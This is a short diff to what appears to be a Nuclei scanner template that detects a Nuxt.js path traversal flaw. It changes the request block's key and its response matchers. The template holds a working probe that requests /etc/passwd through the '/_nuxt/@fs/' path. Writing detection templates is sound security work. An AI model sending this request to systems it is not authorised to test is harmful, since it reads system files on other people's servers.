@@ -6,18 +6,15 @@ info:
   description: |
     This template checks for a path traversal vulnerability in Nuxt.js applications that allows an attacker to read sensitive files such as /etc/passwd.
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/_nuxt/@fs/etc/passwd"
 
-    matchers-condition: and
     matchers:
-      - type: status
-        status:
-          - 200
-
-      - type: regex
+      - type: word
+        words:
+          - "root:x"
+          - "/bin/bash"
         part: body
-        regex:
-          - "root:[x*]:0:0:"
+        condition: or
